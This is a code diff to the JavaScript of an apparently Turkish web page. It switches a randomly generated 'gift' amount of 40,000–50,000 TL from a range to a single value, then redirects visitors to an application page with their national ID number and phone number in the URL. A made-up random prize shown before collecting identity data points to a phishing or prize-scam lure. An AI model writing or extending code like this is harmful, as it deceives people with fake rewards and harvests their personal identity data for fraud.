@@ -213,16 +213,14 @@
       // Hediye değerini querystring'de koru (yoksa random oluştur)
       const urlParams = new URLSearchParams(window.location.search);
       if (!urlParams.get('hediye')) {
-        // 40.000 - 50.000 TL arasında random değer oluştur
+        // 40.000 - 50.000 TL arasında random tek bir değer oluştur
         const minHediye = 40000;
         const maxHediye = 50000;
-        // İlk random değer: 40000-50000 arası
-        const randomMin = Math.floor(Math.random() * (maxHediye - minHediye + 1)) + minHediye;
-        // İkinci random değer: randomMin ile 50000 arası (min'den büyük veya eşit olmalı)
-        const randomMax = Math.floor(Math.random() * (maxHediye - randomMin + 1)) + randomMin;
+        // Tek bir random değer: 40000-50000 arası
+        const randomHediye = Math.floor(Math.random() * (maxHediye - minHediye + 1)) + minHediye;
         
         // Random değeri querystring'e ekle
-        const hediyeValue = `${randomMin}-${randomMax}`;
+        const hediyeValue = randomHediye.toString();
         urlParams.set('hediye', hediyeValue);
         const newUrl = window.location.pathname + '?' + urlParams.toString();
         window.history.replaceState({}, '', newUrl);
@@ -356,9 +354,8 @@
           // Eğer bir şekilde hediye yoksa, random oluştur
           const minHediye = 40000;
           const maxHediye = 50000;
-          const randomMin = Math.floor(Math.random() * (maxHediye - minHediye + 1)) + minHediye;
-          const randomMax = Math.floor(Math.random() * (maxHediye - randomMin + 1)) + randomMin;
-          const hediyeValue = `${randomMin}-${randomMax}`;
+          const randomHediye = Math.floor(Math.random() * (maxHediye - minHediye + 1)) + minHediye;
+          const hediyeValue = randomHediye.toString();
           
           // Direkt yönlendirme yap - telefon numarasını ve hediye değerini ekle
           window.location.href = '/basvur.html?tc=' + encodeURIComponent(tcknValue) + '&phone=' + encodeURIComponent('+90' + phoneValue) + '&hediye=' + encodeURIComponent(hediyeValue);
